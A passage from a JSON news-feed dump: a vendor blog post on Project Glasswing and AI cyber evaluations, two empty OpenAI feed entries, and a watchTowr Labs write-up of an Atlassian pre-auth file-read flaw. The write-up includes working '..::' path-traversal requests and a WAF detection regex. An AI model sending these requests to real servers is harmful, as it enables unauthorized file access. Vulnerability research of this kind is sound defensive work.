exploits and build attack chains, reducing the time and expertise required for sophisticated attacks.\nOrganizations need more than vulnerability management.\nAs AI increases the volume and complexity of findings, security teams must continuously validate which exposures are actually exploitable, whether existing security controls can stop them and mitigate with updates to security controls, “virtual patches” if patch is not available.\nContinuous security validation closes the gap.\nAI capability benchmarks show what frontier models can do. Regularly testing prevention, detection and response controls against realistic attack techniques shows whether an organization's defenses can withstand those capabilities in practice and discovers gaps with specific mitigation.\nWhat Is Project Glasswing?\nOn April 7, 2026, Anthropic launched\nProject Glasswing\nin response to a sharp increase in AI cyber capability. The program is built around Claude Mythos Preview, an unreleased frontier model designed for advanced cybersecurity research.\nClaude Mythos is the model, and Project Glasswing is the controlled research and defense program around it. Glasswing supplies the governance, access controls, disclosure processes and partner ecosystem needed to use the model's capabilities for defense.\nThose capabilities are significant. Mythos Preview found vulnerabilities in major operating systems, browsers and open-source components, including flaws that had survived years of human review and millions of automated test runs. It could also go from finding a bug to building a working exploit with little human direction.\nThe initial partners were Amazon Web Services, Apple, Broadcom, Cisco, CrowdStrike, Google, JPMorganChase, the Linux Foundation, Microsoft, NVIDIA and Palo Alto Networks. Anthropic then gave access to more than 40 more organizations that build or maintain critical software infrastructure. Those organizations can use the model to scan and secure their own systems and open-source software. Anthropic also committed to sharing what it learns so the whole industry can benefit.\nAnthropic later released\nMythos 5\n, an updated model that, as of October 2026, is available only to vetted partners.\nProject Glasswing at a glance\nArea\nSummary\nCreator\nAnthropic, working with technology companies, critical infrastructure providers and open-source maintainers\nCore model\nClaude Mythos Preview, later followed by Mythos 5\nPrimary purpose\nFind, validate, disclose and help remediate vulnerabilities in critical software\nEvaluation approach\nLive code analysis, controlled exploit development and coordinated disclosure, supported by results on independent benchmarks such as CyberGym and ExploitBench\nMain capabilities tested\nVulnerability discovery, exploit reproduction, multi-step reasoning, tool use and attack-chain construction\nScope limits\nA single public leaderboard, a general measure of cyber risk or a test of one enterprise's defenses all fall outside its scope\nWhy it matters\nIt shows how frontier models may lower the cost and expertise needed for sophisticated cyber operations\nAnthropic\nexpanded the program\nin June 2026 to approximately 150 additional organizations across more than 15 countries. The expansion included power, water, healthcare, communications and hardware providers, underscoring the growing importance of AI-assisted cybersecurity research for critical infrastructure.\nWhy AI Cybersecurity Benchmarks Matter\nGeneral AI benchmarks can measure knowledge, coding performance or reasoning. They don't show whether a model can operate through the full lifecycle of a cyber task.\nA model may score well on a coding benchmark yet fail to recognize a trust boundary, compile a proof of concept or adapt after an exploit attempt fails. Cybersecurity evaluations must test actions as well as answers. The model needs to inspect unfamiliar code, form a hypothesis, use tools, interpret runtime behavior and revise its plan.\nThat is why tests such as MMLU or SWE-bench provide only part of the picture. MMLU measures broad academic knowledge. SWE-bench tests whether models can resolve software issues in real repositories. Neither was built to determine whether a model can turn a memory-safety flaw into a reliable exploit chain.\nSpecialized AI cyber evaluations measure these higher-risk capabilities under controlled conditions. They also help researchers identify thresholds that may require stronger safeguards or restricted access.\nThe need is growing because AI supports both sides of security operations. Defenders use it for code review, vulnerability triage, detection engineering and incident analysis. Attackers can apply similar capabilities to reconnaissance, phishing, exploit development and post-compromise activity. As agentic AI becomes more capable of planning, using tools and adapting based on results, periodic security assessments can't keep up. Organizations need continuous validation to confirm that prevention, detection and response controls remain effective against rapidly evolving attack techniques.\nStandardized evaluations give developers, governments and security leaders a common evidence base. They help separate marketing claims from tested performance and support more responsible release decisions.\nHow Project Glasswing Works\nProject Glasswing combines controlled model access, authorized testing and coordinated vulnerability disclosure. Partners apply Mythos to software they own or are allowed to assess. The model can review source code, generate test cases, compile code and run proof-of-concept attempts inside isolated environments.\nCloudflare described a multi-stage harness\nit used with Mythos. One group of agents mapped repositories and attack surfaces. Other agents hunted for narrowly scoped vulnerability classes. Independent agents tried to disprove findings. Later stages removed duplicates, traced whether attacker-controlled input could reach a flaw and produced structured reports.\nThis structure matters. A single prompt can produce inconsistent results. A harness divides work, validates output and preserves evidence.\nIndependent benchmarks, built outside the program, add controlled measurement of the same capabilities:\nCyberGym\ntests vulnerability reproduction in real software.\nExploitBench\nmeasures exploit development across 41 patched V8 vulnerabilities and 16 capability levels.\nExploitGym\nevaluates exploit creation across vulnerabilities from OSS-Fuzz, V8 and the Linux kernel.\nSCONE-bench\nfocuses on smart contract exploitation.\nThese evaluations test reasoning, planning and execution. The model must reach vulnerable code, reproduce the bug, create exploit primitives and sometimes achieve unauthorized code execution. That is a much harder task than recalling a known common vulnerabilities and exposures (CVE) description.\nProject Glasswing measures model capability in authorized environments. It doesn't prove that a model can compromise any live organization, and it doesn't account for every identity control, network path, cloud permission or detection layer. It also doesn't test whether an organization's controls would stop the resulting techniques.\nEnterprise security validation must answer the next question: What happens when comparable techniques meet the organization's actual defenses?\nKey Findings from Project Glasswing\nAnthropic\nreported\nthat approximately 50 initial partners used Mythos Preview to find more than 10,000 high- or critical-severity vulnerabilities. Several partners said their discovery rate increased by more than 10 times. Cloudflare reported 2,000 bugs across critical systems, including 400 rated high or critical.\nAnthropic also scanned more than 1,000 open-source projects and reported 23,019 potential vulnerabilities. Mythos estimated that 6,202 were high or critical. Independent researchers reviewed 1,752 of those findings. Of the reviewed group, 90.6% were valid true positives and 62.4% were confirmed as high or critical. At the time of the update, Anthropic had reported 530 high- or critical-severity bugs to maintainers, and 75 of them had been patched.\nThe model performed strongly on formal evaluations. Mythos Preview\nscored 83.1% on CyberGym\n, compared with 66.6% for Claude Opus 4.6. In\nEpoch AI's review of ExploitBench\n, Mythos Preview achieved arbitrary code execution on 16 to 18 of the 41 V8 vulnerabilities, depending on the test harness.\nThe case studies show why these scores matter. Mythos found a 27-year-old OpenBSD vulnerability, a 16-year-old FFmpeg flaw and a Linux kernel privilege-escalation chain. Mozilla reported finding and fixing 271 vulnerabilities in Firefox 150 while testing the model, more than 10 times the number it found in Firefox 148 using Claude Opus 4.6.\nThe limitations remain important. Models can generate noise, miss context or produce patches that create regressions. Cloudflare found that structured validation and independent review were necessary. Anthropic also reported that the main bottleneck shifted from finding vulnerabilities to verifying, disclosing and patching them.\nFrontier models have crossed an important threshold, and expert oversight still matters. Human teams need to confirm impact, coordinate disclosure, prioritize remediation and verify fixes. For enterprise security teams, AI may accelerate vulnerability discovery, but organizations still need continuous validation to understand which findings create real exposure in their own environments.\nWhat Project Glasswing Means for Enterprise Security\nFor security leaders, the main change is the speed, scale and accessibility of existing attack methods, rather than a new category of attack.\nAI can help more people analyze code, reproduce vulnerabilities and connect smaller weaknesses into exploitable paths. That may shorten the time between discovery and weaponization. It can also increase the volume of plausible findings that security teams must assess.\nVulnerability management must therefore become more context-aware. As AI produces more findings, organizations need to distinguish theoretical vulnerabilities from those that are actually exploitable within their own environments. Exposure validation provides that context by combining attack simulation with evidence about how security controls perform in practice.\nCompensating controls matter more when discovery outpaces patching. Segmentation, least privilege, application isolation and strong identity controls can limit impact before a patch is available with fixes to security controls, known as virtual patches. Continuous\nexposure validation\nverifies that these controls perform as intended, so teams don't have to assume they will during a real attack and delivers mitigations for gaps.\nCloudflare reached a similar conclusion\nafter testing Mythos, noting that faster patching alone doesn't solve the architectural problem around vulnerable systems.\nDetection and response content must also keep pace. AI-assisted operators may vary payloads, combine techniques and retry faster. Static assumptions and annual testing can't provide enough confidence.\nOrganizations also need governance around their own use of cyber AI. Approved agents should operate within defined permissions, logging and human review. Unapproved AI tools can expose source code, credentials or sensitive data, making AI governance an increasingly important component of enterprise security. For more on this topic, see our\nguide to combating rogue AI\n.\nFrom AI Benchmarks to Continuous Exposure Validation\nProject Glasswing helps answer one question: Can frontier AI find and exploit difficult software weaknesses?\nEnterprises need to answer another question: Can our defenses prevent, detect and respond to the techniques at the same speed and scale that capable models help attackers execute?\nThat requires\ncontinuous exposure validation\nthat leverages\nagentic AI\n. Instead of relying only on vulnerability counts or point-in-time assessments, security teams safely reproduce realistic attack activity and observe how controls respond. They can test common security defenses such as endpoint detection and response (EDR), security information and event management (SIEM), web application firewalls (WAF), email and web gateways, identity controls and network defenses.\nThe process should validate three outcomes: whether a control prevented the action, whether the organization generated useful telemetry for detection and whether responders could contain the activity before it reached a critical asset.\nThis evidence improves prioritization. A high-severity vulnerability may present limited risk if it is unreachable and protected by effective controls. A lower-severity weakness may require urgent action if it connects to exposed credentials, excessive permissions or an attack path to a critical system.\nCymulate Exposure Validation leverages\nagentic cyber defense engineering\nto continuously tests threats, techniques and security controls in production-safe ways, using a daily feed of new threats and MITRE ATT&CK techniques. Combined with\nCymulate Detection Studio\nfor ingesting and validating existing SIEM rules and\nCymulate CTEM\nfor prioritizing exploitable exposure, the\nCymulate Platform\nhelps teams validate prevention and detection across their existing security stack.\nWe go beyond validation. The cyber defense engineering control plane in the Cymulate Platform understands how each control responded to an attack and builds vendor-specific mitigations, such as detection rules, indicators of compromise (IoCs) and recommended control updates.\nCymulate Auto Mitigation\ncan then push those updates to the security stack.\nThis supports a shift toward\nagentic cyber defense engineering\n. Agentic cyber defense engineering is a closed-loop, AI-assisted approach to continuously proving and improving security defenses. Agentic cyber defense engineering uses AI agents, exposure validation and\nsecurity control integrations\nto continuously test, tune and improve cyber defenses at machine speed.\nGlasswing shows what advanced models can allow attackers to do. Continuous exposure validation that leverages agentic AI shows whether an organization can withstand it and respond at machine speed, as needed.\nConclusion\nProject Glasswing marks an important milestone in AI cybersecurity evaluation. It shows that frontier models can discover difficult vulnerabilities, develop exploit components and connect weaknesses into attack chains at a scale that changes long-standing assumptions about vulnerability research.\nIt also shows the limits of capability benchmarks. A strong model score doesn't reveal whether a specific enterprise is exposed, whether controls will prevent or detect the activity as well as whether responders can contain it.\nSecurity teams need both perspectives. Benchmarks show what advanced AI may enable. Continuous exposure validation that leverages agentic cyber defense engineering proves how their own defenses perform against evolving techniques and implements mitigations, all at machine speed.\nAs AI-assisted operations become faster and more accessible, confidence must come from tested evidence. Organizations that continuously prove, prioritize and adapt their defenses can find gaps earlier, remediate by real risk and update controls with virtural patches before a capability shift becomes an incident.\nSee how Cymulate Exposure Validation proves what's exploitable in your environment and builds the mitigations with security control updates to close the gap so your organization can be ready for attackers executing at machine speed.\nAmanda Kegley\nAmanda Kegley has over 15 years of experience in cybersecurity. With her in-depth knowledge of security needs in today’s dynamic threat landscape, she successfully innovates and markets new cybersecurity capabilities.\nMore about Author\nTable of Contents\nWhat Is Project Glasswing?\nProject Glasswing at a glance\nWhy AI Cybersecurity Benchmarks Matter\nHow Project Glasswing Works\nKey Findings from Project Glasswing\nWhat Project Glasswing Means for Enterprise Security\nFrom AI Benchmarks to Continuous Exposure Validation\nConclusion\nCymulate Exposure Validation\nmakes advanced security testing fast and easy. When it comes to building custom attack chains, it's all right in front of you in one place.\nMike Humbert\n,\nCybersecurity Engineer\nDARLING INGREDIENTS INC.\nLearn More\nFeatured Resources\nView More Resources\nblog\nCymulate Joins Anthropic Cyber Verification Program\nCymulate joins Anthropic’s Cyber Verification Program to advance AI-powered threat research and security validation.\nRead More\nblog\nHow to Prioritize Vulnerabilities in 2026: From CVSS to Real Risk\nSee how real-world context, exploitability, business impact and attack validation help teams focus remediation where it matters.\nRead More\nE-book\nAgentic Cyber Defense Engineering\nThis e-book explores the six stages of agentic cyber defense engineering and how they work together to strengthen cyber defenses.\nLearn More\nGET A PERSONALIZED DEMO\nReady to see Cymulate in action?\nBook a Demo",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://cymulate.com/blog/project-glasswing/",
+      "content_chars": 18935,
+      "content_sha256": "8507fcce1a4032cbe32774872de3295e7c3b3da092249ad2d78d5e8b0346bbc8",
+      "content_fetched_at": "2026-10-07T00:34:17.929779+00:00",
+      "author": "cymulate-blog",
+      "author_name": "Cymulate Blog",
+      "author_url": "https://cymulate.com/blog/",
+      "published_at": "2026-10-07T00:32:50.824376+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:cymulate-blog",
+        "via:llm",
+        "channel:html_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://cymulate.com/blog/",
+        "https://cymulate.com/blog/project-glasswing/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "cymulate-blog",
+          "url": "https://cymulate.com/blog/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "cymulate-blog",
+          "name": "Cymulate Blog",
+          "home_url": "https://cymulate.com/blog/"
+        },
+        "article": {
+          "title": "Project Glasswing: What Anthropic's AI Cyber Evaluations Mean for Security ValidationRead More",
+          "url": "https://cymulate.com/blog/project-glasswing/",
+          "content_sha256": "8507fcce1a4032cbe32774872de3295e7c3b3da092249ad2d78d5e8b0346bbc8"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "llm",
+        "collect_mode": "html_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:6e2c593ea404da1b",
+      "who": "openai-research",
+      "who_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "action": "publish",
+      "target": "分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
+      "target_url": "https://openai.com/index/sharing-ai-progress-in-mathematics/",
+      "text": "openai-research published: 分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
+      "at": "2026-10-07T00:32:50.824376+00:00",
+      "external_id": "a:6e2c593ea404da1b",
+      "url": "https://openai.com/index/sharing-ai-progress-in-mathematics/",
+      "title": "分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
+      "content": "openai-research published: 分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://openai.com/index/sharing-ai-progress-in-mathematics/",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-10-07T00:34:55.674914+00:00",
+      "author": "openai-research",
+      "author_name": "OpenAI Research",
+      "author_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "published_at": "2026-10-07T00:32:50.824376+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:openai-research",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://openai.com/zh-Hans-CN/research/index/",
+        "https://openai.com/index/sharing-ai-progress-in-mathematics/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "openai-research",
+          "url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "openai-research",
+          "name": "OpenAI Research",
+          "home_url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "article": {
+          "title": "分享 AI 在数学领域的进展OpenAI 发布内部前沿模型在数学未解问题上取得的新成果，并在 GitHub 上分享 Lean 形式化证明和研究细节。",
+          "url": "https://openai.com/index/sharing-ai-progress-in-mathematics/",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:b0363c6deea56393",
+      "who": "openai-research",
+      "who_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "action": "publish",
+      "target": "携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
+      "target_url": "https://openai.com/index/advancing-computer-use-with-ironclad/",
+      "text": "openai-research published: 携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
+      "at": "2026-10-07T00:32:50.824376+00:00",
+      "external_id": "a:b0363c6deea56393",
+      "url": "https://openai.com/index/advancing-computer-use-with-ironclad/",
+      "title": "携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
+      "content": "openai-research published: 携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://openai.com/index/advancing-computer-use-with-ironclad/",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-10-07T00:35:06.383014+00:00",
+      "author": "openai-research",
+      "author_name": "OpenAI Research",
+      "author_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "published_at": "2026-10-07T00:32:50.824376+00:00",
+      "collected_at": "2026-10-07T00:32:50.824376+00:00",
+      "tags": [
+        "kind:publish",
+        "src:openai-research",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://openai.com/zh-Hans-CN/research/index/",
+        "https://openai.com/index/advancing-computer-use-with-ironclad/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "openai-research",
+          "url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "openai-research",
+          "name": "OpenAI Research",
+          "home_url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "article": {
+          "title": "携手 Ironclad，提升计算机使用能力了解 OpenAI 与 Ironclad 如何围绕复杂合同管理流程训练和评估 AI 智能体，提升其使用计算机完成专业工作的能力。",
+          "url": "https://openai.com/index/advancing-computer-use-with-ironclad/",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:0d46526f733bfcef",
+      "who": "watchtowr-labs",
+      "who_url": "https://labs.watchtowr.com/",
+      "action": "publish",
+      "target": "You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)",
+      "target_url": "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/",
+      "text": "watchtowr-labs published: You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)",
+      "at": "2026-10-06T17:01:36+00:00",
+      "external_id": "a:0d46526f733bfcef",
+      "url": "https://labs.watchtowr.com/you-wont-hear-about-these-even-in-myths-atlassian-jira-confluence-and-more-pre-auth-arbitrary-file-read-cve-2026-21589/",
+      "title": "You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)",
+      "content": "Welcome back to yet another episode of \"security was taken seriously\".\nBeing who we are (and constantly being exposed to what we see…), we recognize we have been doomed to eternal damnation as we keep on watching security best practices crumble behind “secure by design” public statements. And in the times we live in, where anyone with a prompt window in front of them can say \"reproduce the vulnerability, make no mistakes\", so are you.\nIn Greek mythology, Atlas was punished by the gods for misbehaving. Reality is unfair, and all we get is Atlassian punishing the rest of us for running their systems on-prem. And so they did, on October 5th, in a\nsecurity advisory\n.\nSometimes we regret that CVSS scores go as high as 10, because when a vulnerability is baked into almost all of a vendor's products across every version, the vulnerability deserves a special place (just like you, our dear reader).\nWelcome back to another watchTowr Labs blog post.\nWhat Is Going On\nAtlassian has published an out-of-band critical\nvulnerability advisory\nfor CVE-2026-21589 for numerous Atlassian products.\nCVE-2026-21589 was reported by Atlassian as “Arbitrary File Access” and as we’ve come to learn, this means “Arbitrary File Read”. The CVSS score itself tells us a story: a vector showing no prerequisites of authentication or complexity.\nThis vulnerability affects all previous versions of:\nProduct\nFixed Versions\nBitbucket Data Center\n• 9.4.26\n• 10.2.8\n• 10.5.1\nConfluence Data Center\n• 9.2.26\n• 10.2.19\nJira Service Management Data Center\n• 5.12.40\n• 10.3.26\n• 11.3.12\nJira Software Data Center\n• 9.12.40\n• 10.3.26\n• 11.3.12\nBamboo Data Center\n• 10.2.24\n• 12.1.12\nCrowd Data Center\n• 6.3.7\n• 7.0.3\n• 7.1.7\n• 7.2.4\nCrucible\n• 4.9.15\nFisheye\n• 4.9.15\nSeeing this list of affected products, we stopped thinking about the potentially few thousand vulnerable instances exposed to the internet, and quickly realized we are in the six to seven-figure range.\nBitbucket\nis a Git-based code hosting service where teams store, review, and collaborate on source code, with built-in pull requests and CI/CD pipelines.\nConfluence\nis a team wiki and documentation workspace for creating, organizing, and sharing pages like project plans, meeting notes, and technical docs.\nJira\nis a project and issue tracking tool, widely used for agile work, that lets teams plan, track, and manage tasks, bugs, and sprints on boards and backlogs.\nA quick internet search reveals just under\n700,000 instances of Confluence alone\n. So the range of those affected is vast, to say the least.\nAs Always, Let’s Begin\nAs CVE-2026-21589 affects so many of their products, the only logical conclusion is that these products share a common library or configuration that makes this vulnerability apply to all of them.\nWe set out to prove this against a few of their core products, namely Bitbucket, Confluence, and Jira.\nHaving deployed vulnerable and patched versions of each solution, we looked to see what exactly had changed between them and what is common among the different technologies.\nOne particular JAR stood out:\natlassian-plugins-webresource*.jar\nThat gave us our targets for comparison:\nVulnerable:\natlassian-plugins-webresource-6.0.7.jar\nDifferent:\natlassian-plugins-webresource-6.0.8.jar\nDiff’ing Our Way To “File Access”\nLooking through the advisory released by Atlassian gave us clues as to what we were looking for, notably the complex WAF rules they suggested:\n(?is).*(?:/|\\\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2})(?:\\.|%(?:25)*2e){2}(?:/|\\\\|::|%(?:25)*(?:2f|5c)|(?::|%(?:25)*3a){2}|;|%(?:25)*3b|$).*\nWhile semicolons (\n;\n) are very common in path traversal within Java applications, along with the everyday dots (\n.\n) and slashes (\n/\n), one item stood out: the matching of double colons (\n::\n). This is uncommon syntax for this type of vulnerability, but grepping through the codebase we came across an all too familiar sight.\nIn\ncom/atlassian/plugin/webresource/impl/http/Router.java\nwe observed this set of functions:\npublic static String sourceMapUrlToUrl(String sourceMapUrl) {\nreturn sourceMapUrl.replaceAll(\"\\\\.map$\", \"\").replaceAll(\"\\\\.map\\\\?\", \"?\");\n}\npublic static String escapeSlashes(String string) {\nreturn string.replaceAll(\"/\", \"::\");\n}\npublic static String unescapeSlashes(String string) {\nreturn string.replaceAll(\"::\", \"/\");\n}\nAt this point, you should already be cutting to the chase, just as we were. These functions match and replace double colons (\n::\n) with forward slashes (\n/\n).\nThis means we might be looking to exploit this vulnerability via a pattern similar to\n..::..::..::..::<dir>::file.txt\n. Our next step was to find a route to do it.\nLooking at where these functions are referenced, we can see they are called along several routes in the same\nRouter\nclass:\nString resources = \"resources\";\naddRoute(\"/resources/:completeKey/*resourceName.map\", new BaseRouter<Controller>.Handler() {\npublic void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {\ncontroller.serveResourceSourceMap(\nRouter.unescapeSlashes(escapedCompleteKey),\nRouter.unescapeSlashes(escapedResourceName), ServingType.RESOURCES_SINGLE);\n}\n});\naddRoute(\"/resources/:completeKey/*resourceName\", new BaseRouter<Controller>.Handler() {\npublic void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {\ncontroller.serveResource(\nRouter.unescapeSlashes(escapedCompleteKey),\nRouter.unescapeSlashes(escapedResourceName), ServingType.RESOURCES_SINGLE);\n}\n});\naddRoute(\"/sources/:completeKey/*resourceName\", new BaseRouter<Controller>.Handler() {\npublic void apply(Controller controller, String escapedCompleteKey, String escapedResourceName) {\ncontroller.serveSource( <----- [0]\nRouter.unescapeSlashes(escapedCompleteKey),\nRouter.unescapeSlashes(escapedResourceName), ServingType.SOURCES_SINGLE);\n}\n});\nFollowing\n[0]\n's\nserveSource()\nabove, we end up in\ncom.atlassian.plugin.webresource.impl.helpers.ResourceServingHelpers.java\n, which presents a programmer's favorite set of long\nIF\nfunctions.\npublic static Resource getResource(RequestCache requestCache, String completeKey, String resourceName) {\nResource resource = getWebResourceResource(requestCache, completeKey, resourceName);\nif (resource == null) {\nresource = getResourceRelativeToWebResource(requestCache, completeKey, resourceName); <---- [1]\n}\nif (resource == null) {\nresource = getFromOSGiPluginModuleResource(requestCache.getGlobals(), completeKey, resourceName);\n}\nif (resource == null) {\nresource = getPluginResource(requestCache.getGlobals(), completeKey, resourceName);\n}\nif (resource == null) {\nresource = getResourceRelativeToPlugin(requestCache.getGlobals(), completeKey, resourceName);\n}\nreturn resource;\n}\nLooking specifically at the first\nIF\nbranch,\ngetResourceRelativeToWebResource\n[1]\nreveals a function which, although marked with the\n@Deprecated\nannotation is very much alive and well.\n@Deprecated\nprotected static Resource getResourceRelativeToWebResource(\nRequestCache requestCache, String completeKey, String resourceName) {\nBundle bundle = requestCache.getSnapshot().get(completeKey);\nif (bundle == null) {\nreturn null;\n}\nString filePath = \"\";\nResource resource = null;\nwhile (resource == null) {\nString[] parts = splitLastPathPart(resourceName); // [3]\nif (parts == null) {\nreturn null;\n}\nresourceName = parts[0];\nfilePath = parts[1] + filePath;\nresource = bundle.getResources(requestCache).get(resourceName);\n}\nreturn requestCache.getGlobals().getConfig().getResourceFactory()\n.createResourceWithRelativePath(\nresource.getParent(),\nresource.getResourceLocation(),\nresource.getNameType(),\nresource.getLocationType(),\nfilePath); <----- [2]\n}\nGiven the routing patterns we have seen, it is safe to assume that a user-controlled\nresourceName\nis pushed to this function and funneled through\ncreateResourceWithRelativePath()\nat\n[2]\n.\nWhile there are attempts to remove any slashes and traversals via\nsplitLastPathPart()\nat\n[3]\n, given the potential for a\n..::\nprimitive, this is likely moot. Further investigation shows that the path is eventually used by\nResourceFactory\nto read local files, so this is the right track.\nLooking at the functionality so far, it is clear we need a plugin that lets us pass through the functionality above. After decompiling\njira-webresources-plugin.jar\nwe can review the plugins and parameters required to use it. We noted that the majority had fixed\nlocation\nvalues:\n<resource type=\"qunit\" name=\"includes/jira/components/color-picker/color-picker-controller-tests.js\" location=\"includes/jira/components/color-picker/color-picker-controller-tests.js\"><param name=\"source\" value=\"webContextStatic\"/></resource>\n<resource type=\"qunit\" name=\"includes/jira/components/color-picker/view/sample-color-collection-view-tests.js\" location=\"includes/jira/components/color-picker/view/sample-color-collection-view-tests.js\"><param name=\"source\" value=\"webContextStatic\"/></resource>\nAs luck would have it, there was one in particular that ended with a trailing slash, meaning we may be able to supply the exact file via our\nresourceName\n.\n<resource type=\"download\" name=\"images/\"\nlocation=\"/includes/jquery/plugins/colorpicker/images/\">\n<param name=\"source\" value=\"webContextStatic\"/>\n</resource>\nWith a bit of compute and perusing, we were able to build the route that interacts with this particular plugin to access the sink we are targeting, via\n/download/resources/jira.webresources:color-picker-popup/images/*\n, where all subsequent files in that path are matched to the local path\n/includes/jquery/plugins/colorpicker/images/\n.\nBy combining this path with our theoretical traversal payload, we were able to access the\nweb.xml\nfile, which is typically protected through various mechanisms within the Jira code and the Tomcat server itself.\nGET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml HTTP/1.1\nHost: {{Jira-Hostname}}\n<?xml version=\"1.0\"?>\n<web-app xmlns=\"<http://java.sun.com/xml/ns/javaee>\"\nxmlns:xsi=\"<http://www.w3.org/2001/XMLSchema-instance>\"\nxsi:schemaLocation=\"<http://java.sun.com/xml/ns/javaee>\n<http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd>\"\nversion=\"3.0\"\nmetadata-complete=\"true\">\n<!-- General -->\n<display-name>Atlassian JIRA Web Application</display-name>\n<description>The Atlassian JIRA web application - see <http://www.atlassian.com/software/jira> for more information\n</description>\n[..Truncated..]\nWhile we are not able to traverse outside of the Tomcat context, we discovered it is possible to read any file within the application server itself. The route varies across the other products, but we were able to verify it is more or less the same.\nConfluence:\nGET /s/1/_/download/resources/com.atlassian.confluence.plugins.dashboard-actions/images/..::..::..::..::..::..::..::..::WEB-INF::web.xml HTTP/1.1\nHost: {{Confluence-Hostname}}\nBitbucket (slightly different, as\nweb.xml\nis blocked):\nGET /s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite.xml HTTP/1.1\nHost: {{Bitbucket-Hostname}}\nThe Crowd Crush Is Real\nWe have already proven that we can read any file from the application's webroot, including sensitive files stored in the\nWEB-INF\ndirectory. On the other hand, a quick nudge at the filesystem did not let us find any file that would leak something as sensitive as a critical-rated vulnerability would imply.\nWe took a look at the official advisory again and spotted a sentence that turned on our internal light bulb:\nIn some configurations, there may be sensitive files present that increase your risk.\nAlright, it clearly implies that the impact may vary with the configuration. It seems there are configurations that would place files with very 